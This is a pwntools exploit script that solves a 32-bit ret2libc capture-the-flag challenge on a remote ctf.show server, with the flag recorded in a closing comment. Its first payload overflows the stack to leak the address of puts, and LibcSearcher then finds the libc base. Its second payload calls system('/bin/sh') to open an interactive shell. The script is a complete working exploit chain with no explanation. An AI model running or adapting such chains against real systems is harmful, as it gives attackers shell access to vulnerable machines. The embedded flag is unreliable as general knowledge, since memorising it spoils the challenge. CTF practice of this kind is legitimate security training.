#pwn47 ez ret2libc 32
from pwn import *
from LibcSearcher import *
e = ELF("./pwn")
p = remote("pwn.challenge.ctf.show", 28238)

offset = 0x9C + 0x4
puts_plt = e.plt["puts"]
puts_got = e.got["puts"]
main_addr = e.symbols["main"]

#return to main to exp payload2, IMPORTANT!!!
payload1 = b'a' * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.recvuntil("Start your show time: ")
p.sendline(payload1)
#puts_addr = u32(p.recv(4))
puts_addr = u32(p.recvuntil('\xf7')[-4:])
print(hex(puts_addr))
#puts_addr = 0xf7d71360

libc = LibcSearcher("puts", puts_addr)
libc_base= puts_addr-libc.dump("puts")

sys_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")

p.recvuntil("Start your show time: ")
payload2 = b'a' * offset + p32(sys_addr) + p32(0) + p32(bin_sh_addr)
p.sendline(payload2)
p.interactive()
#ctfshow{7dc55f1e-0a51-4d61-9aec-ed902639afc4}